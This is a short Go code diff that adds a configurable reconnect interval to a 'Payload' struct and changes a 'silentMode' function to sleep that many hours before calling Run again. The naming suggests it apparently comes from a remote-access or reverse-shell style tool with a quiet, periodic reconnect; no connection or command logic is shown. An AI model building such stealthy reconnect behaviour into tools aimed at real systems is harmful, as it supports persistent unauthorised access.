@@ -19,9 +19,10 @@ const BufferSize = 1024
 
 // Payload needs description
 type Payload struct {
-	Port   int
-	Target string
-	Conn   net.Conn
+	Port       int
+	Target     string
+	Conn       net.Conn
+	ReconnTime time.Duration
 }
 
 // Run executes the payload
@@ -62,7 +63,7 @@ func (p *Payload) Run() {
 
 func (p *Payload) silentMode(wg *sync.WaitGroup) {
 	defer wg.Done()
-	time.Sleep(1 * time.Hour)
+	time.Sleep(p.ReconnTime * time.Hour)
 
 	// reconnect
 	p.Run()
